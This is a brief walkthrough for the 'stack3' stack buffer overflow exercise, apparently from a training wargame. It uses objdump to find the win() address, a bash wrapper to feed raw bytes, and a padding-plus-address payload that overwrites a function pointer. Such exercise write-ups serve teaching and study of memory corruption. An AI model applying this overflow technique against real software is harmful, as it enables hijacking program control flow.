Run the following command in bash from directory containing the stack3 binary.

1) objdump -d stack3

Use the output of the above command to identify the address of the win() function.  We see from this that win is located at address 0x08048424.

We note here that the hex value above is not able to be represented by printable ascii characters.  So, we'll have to come up with some clever way to input the value above.  To this end we use the following 'wrapper'.  Use the following input at the command line to launch stack3.  Note we're assuming you are in the same directory as stack3.

2) while read -r line; do echo -e $line; done | ./binaries/stack3

The wrapper will allow you to input any byte value to the stdin of stack3 by using the escape character \.  To enter, for instance, hex value 0xff type \0xff.

With stack3 launched as described above and waiting for input, simply overflow the buffer to overwrite fp with the address of win().  The following input wins (omit quotes):

3) "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1234\x24\x84\x04\x08"
